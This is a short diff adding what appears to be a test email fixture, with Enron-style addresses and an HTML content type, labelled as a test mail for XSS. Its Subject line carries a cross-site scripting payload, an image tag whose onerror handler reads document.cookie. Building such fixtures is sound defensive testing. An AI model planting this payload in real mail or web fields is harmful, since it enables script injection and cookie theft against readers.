@@ -1,0 +1,7 @@
+From: "sfrg mooney" <sfrg.mooney@CEDARWOODS-K9.COM>
+To: shelley.corman@enron.com, lynn.blair@enron.com, kimberly.watson@enron.com
+Subject: <img src=1 onerror=alert(document.cookie)>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
